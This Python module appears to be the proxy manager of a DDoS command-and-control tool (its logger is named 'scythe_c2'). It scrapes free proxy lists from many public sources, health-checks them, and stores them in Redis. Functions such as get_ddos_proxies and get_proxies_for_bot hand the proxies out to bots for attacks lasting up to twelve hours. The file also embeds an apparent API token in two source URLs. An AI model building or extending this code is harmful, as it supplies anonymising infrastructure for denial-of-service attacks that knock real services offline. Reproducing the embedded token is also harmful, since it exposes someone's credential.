import asyncio
import re
import time
import json
import random
from typing import List, Dict, Optional, Tuple, Any, Set
from datetime import datetime, timedelta
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor
import aiohttp
import logging

from app.core.config import settings
from app.core.redis_client import get_redis, RedisKeys
from app.core.models import ProxyItem, ProxyStats

from app.utils.scrapers import scrape_from_urls as smart_scrape_from_urls
from app.utils.scrapers import scrape_from_url
from app.utils.http_client import http_client

logger = logging.getLogger("scythe_c2.proxy")

# ========== 12+ HOUR STABILITY CONFIG ==========
PROXY_REFRESH_INTERVAL = 180
PROXY_ROTATE_INTERVAL = 60
MID_ATTACK_REFRESH = True
BACKUP_SOURCE_ON_EMPTY = True
MIN_POOL_SIZE_FOR_ATTACK = 50
EMERGENCY_REFRESH_THRESHOLD = 20
MAX_ATTACK_DURATION = 43200
HEALTH_CHECK_BATCH_SIZE = 50
HEALTH_CHECK_TIMEOUT = 4

# ========== PROXY SOURCE DEFINITION ==========
class ProxySource:
    def __init__(self, name: str, url: str, interval: int,
                 format: str = "text", parser: str = "default",
                 protocol: str = "http", priority: int = 5):
        self.name = name
        self.url = url
        self.interval = interval
        self.format = format
        self.parser = parser
        self.protocol = protocol
        self.priority = priority
        self.last_fetch = 0
        self.last_count = 0
        self.success_rate = 1.0
        self.fail_count = 0

PROXY_SOURCES = [
    ProxySource(
        name="proxies.is_global",
        url="https://api.proxies.is/scraped?token=7k6e6J11371Y8H6whs0bc&timeout=15000&excludeASN=&includeASN=&excludeCountry=&includeCountry=&type=",
        interval=180, format="json", parser="proxies.is", protocol="http", priority=10
    ),
    ProxySource(
        name="proxies.is_id",
        url="https://api.proxies.is/scraped?token=7k6e6J11371Y8H6whs0bc&timeout=15000&excludeASN=&includeASN=&excludeCountry=&includeCountry=ID&type=",
        interval=180, format="json", parser="proxies.is", protocol="http", priority=10
    ),
    ProxySource(
        name="proxyscrape_api_http",
        url="https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all",
        interval=300, format="text", protocol="http", priority=9
    ),
    ProxySource(
        name="proxyscrape_api_socks5",
        url="https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all",
        interval=300, format="text", protocol="socks5", priority=9
    ),
    ProxySource(
        name="proxyscrape_api_socks4",
        url="https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all",
        interval=300, format="text", protocol="socks4", priority=8
    ),
    ProxySource(
        name="http_github_shifty",
        url="https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        interval=900, protocol="http", priority=7
    ),
    ProxySource(
        name="http_github_opsxcq",
        url="https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
        interval=900, protocol="http", priority=7
    ),
    ProxySource(
        name="http_github_databay",
        url="https://cdn.jsdelivr.net/gh/databay-labs/free-proxy-list/http.txt",
        interval=900, protocol="http", priority=7
    ),
    ProxySource(
        name="http_github_komutan",
        url="https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/proxies/http.txt",
        interval=900, protocol="http", priority=7
    ),
    ProxySource(
        name="http_github_themiralay",
        url="https://raw.githubusercontent.com/themiralay/Proxy-List-World/master/data.txt",
        interval=900, protocol="http", priority=7
    ),
    ProxySource(
        name="http_github_ian",
        url="https://raw.githubusercontent.com/Ian-Lusule/Proxies/main/proxies/http.txt",
        interval=900, protocol="http", priority=7
    ),
    ProxySource(
        name="http_github_iplocate",
        url="https://raw.githubusercontent.com/iplocate/free-proxy-list/main/protocols/http.txt",
        interval=1800, protocol="http", priority=6
    ),
    ProxySource(
        name="http_github_alilapro",
        url="https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt",
        interval=1800, protocol="http", priority=6
    ),
    ProxySource(
        name="socks5_github_rooster",
        url="https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
        interval=900, protocol="socks5", priority=6
    ),
    ProxySource(
        name="socks5_github_databay",
        url="https://cdn.jsdelivr.net/gh/databay-labs/free-proxy-list/socks5.txt",
        interval=900, protocol="socks5", priority=6
    ),
    ProxySource(
        name="socks5_github_komutan",
        url="https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/proxies/socks5.txt",
        interval=900, protocol="socks5", priority=6
    ),
    ProxySource(
        name="socks5_github_ian",
        url="https://raw.githubusercontent.com/Ian-Lusule/Proxies/main/proxies/socks5.txt",
        interval=900, protocol="socks5", priority=6
    ),
    ProxySource(
        name="socks5_github_iplocate",
        url="https://raw.githubusercontent.com/iplocate/free-proxy-list/main/protocols/socks5.txt",
        interval=1800, protocol="socks5", priority=6
    ),
    ProxySource(
        name="socks5_github_alilapro",
        url="https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks5.txt",
        interval=1800, protocol="socks5", priority=6
    ),
    ProxySource(
        name="socks4_github_rooster",
        url="https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
        interval=900, protocol="socks4", priority=5
    ),
    ProxySource(
        name="https_github_rooster",
        url="https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
        interval=900, protocol="https", priority=6
    ),
    ProxySource(
        name="free-proxy-list.net",
        url="https://free-proxy-list.net/",
        interval=1800, format="html", parser="html_table", protocol="http", priority=4
    ),
    ProxySource(
        name="http_github_sunny",
        url="https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.json",
        interval=900, format="json", parser="json_array", protocol="http", priority=5
    ),
    ProxySource(
        name="backup_proxy_daily",
        url="https://proxy-daily.com/",
        interval=3600, format="html", parser="html", protocol="http", priority=3
    ),
]

# ========== PROXY DATA STRUCTURE ==========
@dataclass
class ProxyData:
    ip: str
    port: int
    protocol: str = "http"
    source: str = "unknown"
    priority: int = 5
    response_time: float = 999.0
    success_count: int = 0
    fail_count: int = 0
    fail_streak: int = 0
    last_check: float = 0.0
    last_used: float = 0.0
    country: str = "unknown"
    is_alive: bool = True
    speed_tier: str = "dead"
    uptime_minutes: float = 0.0

    @property
    def url(self) -> str:
        return f"{self.protocol}://{self.ip}:{self.port}"

    @property
    def key(self) -> str:
        return f"{self.protocol}://{self.ip}:{self.port}"

    @property
    def success_rate(self) -> float:
        total = self.success_count + self.fail_count
        if total == 0:
            return 1.0
        return self.success_count / total

    @property
    def is_fresh(self) -> bool:
        return (time.time() - self.last_check) < 600

    @property
    def is_stale(self) -> bool:
        return (time.time() - self.last_check) > 1800

    def to_dict(self) -> dict:
        return {
            "ip": self.ip,
            "port": self.port,
            "protocol": self.protocol,
            "source": self.source,
            "priority": self.priority,
            "response_time": self.response_time,
            "success_count": self.success_count,
            "fail_count": self.fail_count,
            "fail_streak": self.fail_streak,
            "last_check": self.last_check,
            "last_used": self.last_used,
            "country": self.country,
            "is_alive": self.is_alive,
            "speed_tier": self.speed_tier,
            "uptime_minutes": self.uptime_minutes,
            "url": self.url,
            "success_rate": self.success_rate,
            "is_fresh": self.is_fresh,
        }

    @classmethod
    def from_dict(cls, data: dict) -> "ProxyData":
        return cls(
            ip=data["ip"],
            port=data["port"],
            protocol=data.get("protocol", "http"),
            source=data.get("source", "unknown"),
            priority=data.get("priority", 5),
            response_time=data.get("response_time", 999.0),
            success_count=data.get("success_count", 0),
            fail_count=data.get("fail_count", 0),
            fail_streak=data.get("fail_streak", 0),
            last_check=data.get("last_check", 0.0),
            last_used=data.get("last_used", 0.0),
            country=data.get("country", "unknown"),
            is_alive=data.get("is_alive", True),
            speed_tier=data.get("speed_tier", "dead"),
            uptime_minutes=data.get("uptime_minutes", 0.0),
        )

# ========== PROXY MANAGER v8.1 — FIXED ==========
class ProxyManager:
    def __init__(self):
        self.sources = PROXY_SOURCES
        self.pool_key = RedisKeys.proxy_pool()
        self.alive_key = RedisKeys.proxy_alive()
        self.fast_key = RedisKeys.proxy_fast()
        self.last_scrap_key = RedisKeys.last_scrap()
        self._refresh_tasks = []
        self._running = False
        self._local_cache: Dict[str, ProxyData] = {}
        self._cache_lock = asyncio.Lock()
        self._total_refreshed = 0
        self._total_dead = 0
        self._shared_session: Optional[aiohttp.ClientSession] = None
        self._fetch_sem = asyncio.Semaphore(5)
        self._health_sem = asyncio.Semaphore(30)

    async def _get_session(self) -> aiohttp.ClientSession:
        if self._shared_session is None or self._shared_session.closed:
            connector = aiohttp.TCPConnector(
                limit=50,
                limit_per_host=5,
                ttl_dns_cache=300,
                use_dns_cache=True,
            )
            self._shared_session = aiohttp.ClientSession(
                connector=connector,
                trust_env=False,
                timeout=aiohttp.ClientTimeout(total=30),
            )
        return self._shared_session

    async def _close_session(self):
        if self._shared_session and not self._shared_session.closed:
            await self._shared_session.close()
            self._shared_session = None

    # ==================== FETCH & PARSE ====================
    async def _fetch_source(self, source: ProxySource) -> List[ProxyData]:
        proxies = []
        async with self._fetch_sem:
            try:
                session = await self._get_session()
                async with session.get(source.url, timeout=settings.PROXY_SCRAP_TIMEOUT) as resp:
                    if resp.status != 200:
                        logger.warning(f"[FETCH] {source.name}: HTTP {resp.status}")
                        source.fail_count += 1
                        return []
                    content = await resp.text()

                raw_proxies = []
                if source.format == "json":
                    raw_proxies = self._parse_json(content, source.parser)
                elif source.format == "html":
                    raw_proxies = self._parse_html(content, source.parser)
                else:
                    raw_proxies = self._parse_text(content)

                MAX_PROXIES_PER_SOURCE = 500
                for ip, port in raw_proxies[:MAX_PROXIES_PER_SOURCE]:
                    if self._is_valid_ip(ip) and 1 <= port <= 65535:
                        proxies.append(ProxyData(
                            ip=ip, port=port,
                            protocol=source.protocol,
                            source=source.name,
                            priority=source.priority,
                            last_check=0.0,
                            is_alive=True,
                        ))
                if len(raw_proxies) > MAX_PROXIES_PER_SOURCE:
                    logger.warning(f"[FETCH] {source.name}: Truncated from {len(raw_proxies)} to {MAX_PROXIES_PER_SOURCE}")

                source.fail_count = 0
                logger.info(f"[FETCH] {source.name}: {len(proxies)} scraped")
                return proxies

            except asyncio.TimeoutError:
                source.fail_count += 1
                logger.warning(f"[FETCH] {source.name}: Timeout")
                return []
            except Exception as e:
                source.fail_count += 1
                logger.error(f"[FETCH] {source.name}: {e}")
                return []

    def _parse_text(self, content: str) -> List[Tuple[str, int]]:
        proxies = []
        for line in content.splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if ":" in line:
                parts = line.rsplit(":", 1)
                if len(parts) == 2 and parts[0] and parts[1].isdigit():
                    proxies.append((parts[0], int(parts[1])))
            else:
                parts = line.split()
                if len(parts) == 2 and parts[1].isdigit():
                    proxies.append((parts[0], int(parts[1])))
        return proxies

    def _parse_json(self, content: str, parser: str = "default") -> List[Tuple[str, int]]:
        try:
            data = json.loads(content)
            proxies = []
            if parser == "proxies.is":
                if "proxies" in data:
                    for p in data["proxies"]:
                        ip = p.get("ip")
                        port = p.get("port")
                        if ip and port:
                            proxies.append((ip, int(port)))
            elif parser == "json_array":
                if isinstance(data, list):
                    for item in data:
                        ip = item.get("ip") or item.get("host") or item.get("address")
                        port = item.get("port")
                        if ip and port:
                            proxies.append((ip, int(port)))
            else:
                proxies = self._parse_text(content)
            return proxies
        except json.JSONDecodeError:
            return self._parse_text(content)

    def _parse_html(self, content: str, parser: str = "html_table") -> List[Tuple[str, int]]:
        proxies = []
        if parser == "html_table":
            pattern = r'<td>(\d+\.\d+\.\d+\.\d+)<\/td>\s*<td>(\d+)<\/td>'
            matches = re.findall(pattern, content)
            for ip, port in matches:
                proxies.append((ip, int(port)))
        return proxies

    def _is_valid_ip(self, ip: str) -> bool:
        if ":" in ip and not ip.replace(":", "").isdigit():
            return False
        parts = ip.split(".")
        if len(parts) != 4:
            return False
        for p in parts:
            if not p.isdigit() or not (0 <= int(p) <= 255):
                return False
        return True

    # ==================== MASS HEALTH CHECK ====================
    async def _check_single_proxy(self, proxy: ProxyData, test_url: str = None) -> Tuple[ProxyData, bool, float]:
        url = test_url or "http://httpbin.org/ip"
        proxy_url = f"http://{proxy.ip}:{proxy.port}"
        start_time = time.time()

        async with self._health_sem:
            try:
                session = await self._get_session()
                async with session.get(
                    url,
                    proxy=proxy_url,
                    timeout=aiohttp.ClientTimeout(total=HEALTH_CHECK_TIMEOUT),
                    allow_redirects=False,
                ) as resp:
                    elapsed = time.time() - start_time
                    if resp.status in (200, 301, 302, 403, 429):
                        proxy.response_time = elapsed
                        proxy.success_count += 1
                        proxy.fail_streak = 0
                        proxy.last_check = time.time()
                        proxy.is_alive = True
                        proxy.uptime_minutes += elapsed / 60

                        if elapsed < 1.0:
                            proxy.speed_tier = "ultra_fast"
                        elif elapsed < 3.0:
                            proxy.speed_tier = "fast"
                        elif elapsed < 5.0:
                            proxy.speed_tier = "medium"
                        else:
                            proxy.speed_tier = "slow"

                        return proxy, True, elapsed
                    else:
                        proxy.fail_count += 1
                        proxy.fail_streak += 1
                        proxy.last_check = time.time()
                        return proxy, False, elapsed

            except asyncio.TimeoutError:
                proxy.fail_count += 1
                proxy.fail_streak += 1
                proxy.last_check = time.time()
                proxy.response_time = HEALTH_CHECK_TIMEOUT
                return proxy, False, HEALTH_CHECK_TIMEOUT
            except Exception:
                proxy.fail_count += 1
                proxy.fail_streak += 1
                proxy.last_check = time.time()
                proxy.response_time = HEALTH_CHECK_TIMEOUT
                return proxy, False, HEALTH_CHECK_TIMEOUT

    async def _mass_health_check(self, proxies: List[ProxyData], max_concurrent: int = None) -> List[ProxyData]:
        max_concurrent = max_concurrent or HEALTH_CHECK_BATCH_SIZE
        logger.info(f"[HEALTH] Mass check: {len(proxies)} proxies, concurrent={max_concurrent}")
        start = time.time()

        tasks = [self._check_single_proxy(p) for p in proxies]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        elapsed = time.time() - start
        alive_proxies = []
        dead_count = 0

        for result in results:
            if isinstance(result, Exception):
                dead_count += 1
                continue
            proxy, is_alive, resp_time = result
            if is_alive and proxy.fail_streak < 10:
                alive_proxies.append(proxy)
            else:
                dead_count += 1
                proxy.is_alive = False
                proxy.speed_tier = "dead"

        logger.info(f"[HEALTH] Done: {len(alive_proxies)} alive, {dead_count} dead ({elapsed:.1f}s)")
        return alive_proxies

    # ==================== SMART REFRESH ====================
    async def refresh_source(self, source: ProxySource, skip_health_check: bool = False):
        proxies = await self._fetch_source(source)
        if not proxies:
            return

        if skip_health_check:
            logger.info(f"[REFRESH] {source.name}: Storing {len(proxies)} proxies without health check (initial load)")
            alive_proxies = proxies
        else:
            alive_proxies = await self._mass_health_check(proxies)
            if not alive_proxies:
                logger.warning(f"[REFRESH] {source.name}: All {len(proxies)} dead")
                return

        redis = await get_redis()
        added = 0
        updated = 0

        for proxy in alive_proxies:
            key = proxy.key
            existing_json = await redis.hget(self.pool_key, key)

            if existing_json:
                try:
                    existing = ProxyData.from_dict(json.loads(existing_json))
                    proxy.success_count += existing.success_count
                    proxy.fail_count += existing.fail_count
                    proxy.uptime_minutes = existing.uptime_minutes
                except:
                    pass
                updated += 1
            else:
                added += 1

            await redis.hset(self.pool_key, key, json.dumps(proxy.to_dict()))
            await redis.zadd(self.alive_key, {key: proxy.response_time})

            if proxy.speed_tier in ("ultra_fast", "fast"):
                await redis.zadd(self.fast_key, {key: proxy.response_time})

        all_keys = {p.key for p in proxies}
        alive_keys = {p.key for p in alive_proxies}
        dead_keys = all_keys - alive_keys
        for dk in dead_keys:
            await redis.zrem(self.alive_key, dk)
            await redis.zrem(self.fast_key, dk)

        source.last_fetch = int(time.time())
        source.last_count = len(alive_proxies)
        if proxies:
            source.success_rate = len(alive_proxies) / len(proxies)

        await redis.set(self.last_scrap_key, str(source.last_fetch))
        logger.info(f"[REFRESH] {source.name}: +{added} new, ~{updated} updated, {len(alive_proxies)} alive")

    async def refresh_all(self, force: bool = False, skip_health_check: bool = False):
        logger.info(f"[REFRESH] Full refresh starting... (force={force}, skip_health={skip_health_check})")
        start = time.time()

        sorted_sources = sorted(self.sources, key=lambda s: s.priority, reverse=True)

        now = time.time()
        to_refresh = []
        for src in sorted_sources:
            if force or (now - src.last_fetch) > src.interval:
                to_refresh.append(src)

        if not to_refresh:
            logger.info("[REFRESH] All sources up to date")
            return

        tasks = [self.refresh_source(src, skip_health_check=skip_health_check) for src in to_refresh]
        await asyncio.gather(*tasks)

        elapsed = time.time() - start
        stats = await self.get_stats()
        logger.info(f"[REFRESH] Complete in {elapsed:.1f}s | Pool: {stats.total} | Alive: {stats.alive} | Fast: {stats.fast}")

    # ==================== EMERGENCY REFRESH ====================
    async def emergency_refresh(self) -> int:
        logger.warning("[EMERGENCY] Proxy pool critical! Running emergency refresh...")

        for src in self.sources:
            src.last_fetch = 0

        await self.refresh_all(force=True)

        stats = await self.get_stats()
        logger.info(f"[EMERGENCY] Pool now: {stats.alive} alive")
        return stats.alive

    # ==================== BACKGROUND LOOPS ====================
    async def start_background_refresh(self):
        self._running = True

        # FIX: Skip health check on initial load for fast startup
        await self.refresh_all(force=True, skip_health_check=True)

        for src in self.sources:
            task = asyncio.create_task(self._schedule_source(src))
            self._refresh_tasks.append(task)

        task = asyncio.create_task(self._periodic_full_refresh())
        self._refresh_tasks.append(task)

        task = asyncio.create_task(self._pool_monitor())
        self._refresh_tasks.append(task)

        logger.info(f"[BG] Started: {len(self.sources)} sources + periodic + monitor")

    async def _schedule_source(self, source: ProxySource):
        while self._running:
            try:
                await self.refresh_source(source)
                await asyncio.sleep(source.interval)
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"[BG] {source.name} error: {e}")
                await asyncio.sleep(60)

    async def _periodic_full_refresh(self):
        while self._running:
            try:
                await asyncio.sleep(PROXY_REFRESH_INTERVAL)
                if self._running:
                    await self.refresh_all()
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"[BG] Periodic error: {e}")

    async def _pool_monitor(self):
        while self._running:
            try:
                await asyncio.sleep(60)
                if not self._running:
                    break

                stats = await self.get_stats()
                if stats.alive < EMERGENCY_REFRESH_THRESHOLD:
                    logger.warning(f"[MONITOR] Pool critical: {stats.alive} alive! Triggering emergency...")
                    await self.emergency_refresh()
                elif stats.alive < MIN_POOL_SIZE_FOR_ATTACK:
                    logger.warning(f"[MONITOR] Pool low: {stats.alive} alive. Refreshing...")
                    await self.refresh_all()
                else:
                    logger.info(f"[MONITOR] Pool healthy: {stats.alive} alive, {stats.fast} fast")

            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"[MONITOR] Error: {e}")

    async def stop(self):
        self._running = False
        for task in self._refresh_tasks:
            task.cancel()
        await asyncio.gather(*self._refresh_tasks, return_exceptions=True)
        await self._close_session()
        logger.info("[BG] All background tasks stopped")

    # ==================== DDoS PROXY SELECTION ====================
    async def get_ddos_proxies(self, count: int = 500, min_tier: str = "medium",
                                protocols: List[str] = None) -> List[str]:
        redis = await get_redis()
        tier_order = {"ultra_fast": 0, "fast": 1, "medium": 2, "slow": 3, "dead": 4}
        min_tier_val = tier_order.get(min_tier, 2)

        all_proxies = await redis.zrange(self.alive_key, 0, -1, withscores=True)

        if not all_proxies:
            logger.warning("[DDOS] Pool empty! Triggering emergency...")
            await self.emergency_refresh()
            all_proxies = await redis.zrange(self.alive_key, 0, -1, withscores=True)

        if not all_proxies:
            return []

        filtered = []
        for key, score in all_proxies:
            proxy_json = await redis.hget(self.pool_key, key)
            if not proxy_json:
                continue
            try:
                proxy = ProxyData.from_dict(json.loads(proxy_json))
                proxy_tier_val = tier_order.get(proxy.speed_tier, 4)

                if proxy_tier_val > min_tier_val:
                    continue
                if protocols and proxy.protocol not in protocols:
                    continue
                if time.time() - proxy.last_check > 1800:
                    continue
                if proxy.success_rate < 0.3:
                    continue

                filtered.append(proxy)
            except:
                continue

        filtered.sort(key=lambda p: (-p.priority, -p.success_rate, p.response_time))
        selected = filtered[:count]

        for proxy in selected:
            proxy.last_used = time.time()
            await redis.hset(self.pool_key, proxy.key, json.dumps(proxy.to_dict()))

        urls = [p.url for p in selected]
        logger.info(f"[DDOS] Selected {len(urls)} proxies (tier>={min_tier})")
        return urls

    async def get_fast_proxies(self, count: int = 200) -> List[str]:
        return await self.get_ddos_proxies(count=count, min_tier="fast")

    async def get_mixed_proxies(self, count: int = 500) -> List[str]:
        return await self.get_ddos_proxies(
            count=count, min_tier="medium",
            protocols=["http", "https", "socks5"]
        )

    async def get_proxies_for_bot(self, bot_count: int = 1, proxies_per_bot: int = 100) -> List[List[str]]:
        total_needed = bot_count * proxies_per_bot
        all_proxies = await self.get_mixed_proxies(count=total_needed * 2)

        if not all_proxies:
            return [[] for _ in range(bot_count)]

        random.shuffle(all_proxies)
        distributed = []

        for i in range(bot_count):
            start = (i * proxies_per_bot) % len(all_proxies)
            end = start + proxies_per_bot + 20
            if end > len(all_proxies):
                bot_proxies = all_proxies[start:] + all_proxies[:end - len(all_proxies)]
            else:
                bot_proxies = all_proxies[start:end]
            distributed.append(bot_proxies)

        logger.info(f"[BOT] Distributed proxies to {bot_count} bots (~{proxies_per_bot} each)")
        return distributed

    # ==================== MID-ATTACK REFRESH ====================
    async def refresh_for_attack(self, attack_id: str, duration: int) -> bool:
        if duration > 3600:
            refresh_count = duration // PROXY_REFRESH_INTERVAL
            logger.info(f"[ATTACK-{attack_id}] Long attack ({duration}s). Will refresh proxy {refresh_count}x.")
        return True

    # ==================== PUBLIC API (FIXED) ====================
    async def get_stats(self) -> ProxyStats:
        """FIXED: Return ProxyStats dengan fast attribute."""
        redis = await get_redis()
        total = await redis.hlen(self.pool_key)
        alive = await redis.zcard(self.alive_key)
        fast = await redis.zcard(self.fast_key)
        dead = max(0, total - alive)
        last_scrap = await redis.get(self.last_scrap_key)

        if last_scrap:
            try:
                dt = datetime.fromtimestamp(int(last_scrap)).strftime("%Y-%m-%d %H:%M:%S")
            except:
                dt = "Never"
        else:
            dt = "Never"

        return ProxyStats(total=total, alive=alive, dead=dead, fast=fast, last_scrap=dt)

    async def get_alive_proxies(self) -> List[ProxyItem]:
        """FIXED: Return ProxyItem dengan protocol attribute."""
        redis = await get_redis()
        members = await redis.zrange(self.alive_key, 0, -1)
        proxies = []
        for m in members:
            if "://" in m:
                protocol, rest = m.split("://", 1)
                ip, port = rest.rsplit(":", 1)
                proxies.append(ProxyItem(ip=ip, port=int(port), protocol=protocol))
            elif ":" in m:
                ip, port = m.rsplit(":", 1)
                proxies.append(ProxyItem(ip=ip, port=int(port), protocol="http"))
        return proxies

    async def remove_dead(self) -> int:
        redis = await get_redis()
        keys = await redis.hkeys(self.pool_key)
        removed = 0

        for key in keys:
            proxy_json = await redis.hget(self.pool_key, key)
            if not proxy_json:
                continue
            try:
                proxy = ProxyData.from_dict(json.loads(proxy_json))
                if not proxy.is_alive or proxy.fail_streak >= 10:
                    await redis.hdel(self.pool_key, key)
                    await redis.zrem(self.alive_key, key)
                    await redis.zrem(self.fast_key, key)
                    removed += 1
            except:
                pass

        logger.info(f"[CLEANUP] Removed {removed} dead proxies")
        return removed

    async def health_check_all(self):
        redis = await get_redis()
        alive_members = await redis.zrange(self.alive_key, 0, -1)

        if not alive_members:
            return

        proxies = []
        for key in alive_members:
            proxy_json = await redis.hget(self.pool_key, key)
            if proxy_json:
                try:
                    proxies.append(ProxyData.from_dict(json.loads(proxy_json)))
                except:
                    pass

        if not proxies:
            return

        alive = await self._mass_health_check(proxies)
        alive_keys = {p.key for p in alive}

        for key in alive_members:
            if key not in alive_keys:
                await redis.zrem(self.alive_key, key)
                await redis.zrem(self.fast_key, key)

        logger.info(f"[HEALTH] Full: {len(alive)} alive, {len(alive_members) - len(alive)} dead")

    async def scrap_from_urls(self, urls: List[str]) -> int:
        if not urls:
            return 0

        all_proxies = await smart_scrape_from_urls(urls, timeout=settings.PROXY_SCRAP_TIMEOUT)
        if not all_proxies:
            return 0

        proxy_data_list = []
        for ip, port in all_proxies:
            if self._is_valid_ip(ip) and 1 <= port <= 65535:
                proxy_data_list.append(ProxyData(
                    ip=ip, port=port, protocol="http",
                    source="manual", priority=5
                ))

        alive = await self._mass_health_check(proxy_data_list)

        redis = await get_redis()
        added = 0
        for proxy in alive:
            key = proxy.key
            if not await redis.hexists(self.pool_key, key):
                await redis.hset(self.pool_key, key, json.dumps(proxy.to_dict()))
                await redis.zadd(self.alive_key, {key: proxy.response_time})
                if proxy.speed_tier in ("ultra_fast", "fast"):
                    await redis.zadd(self.fast_key, {key: proxy.response_time})
                added += 1

        await redis.set(self.last_scrap_key, str(int(time.time())))
        logger.info(f"[SCRAP] Manual: +{added} alive from {len(urls)} URLs")
        return added

    async def refresh_pool(self):
        await self.refresh_all()

    async def get_proxy_details(self, proxy_url: str) -> Optional[dict]:
        redis = await get_redis()
        proxy_json = await redis.hget(self.pool_key, proxy_url)
        if proxy_json:
            return json.loads(proxy_json)
        return None

    async def get_top_sources(self) -> List[dict]:
        return [
            {
                "name": s.name,
                "priority": s.priority,
                "success_rate": s.success_rate,
                "last_count": s.last_count,
                "last_fetch": s.last_fetch,
                "fail_count": s.fail_count,
            }
            for s in sorted(self.sources, key=lambda x: x.success_rate, reverse=True)
        ]

    async def get_pool_health(self) -> dict:
        stats = await self.get_stats()
        sources = await self.get_top_sources()

        return {
            "total_pool": stats.total,
            "alive": stats.alive,
            "dead": stats.dead,
            "fast": stats.fast,
            "last_refresh": stats.last_scrap,
            "sources_active": len([s for s in self.sources if s.last_count > 0]),
            "sources_total": len(self.sources),
            "top_sources": sources[:5],
            "can_attack_12h": stats.alive >= MIN_POOL_SIZE_FOR_ATTACK,
            "emergency_needed": stats.alive < EMERGENCY_REFRESH_THRESHOLD,
        }

# ========== SINGLETON ==========
proxy_manager = ProxyManager()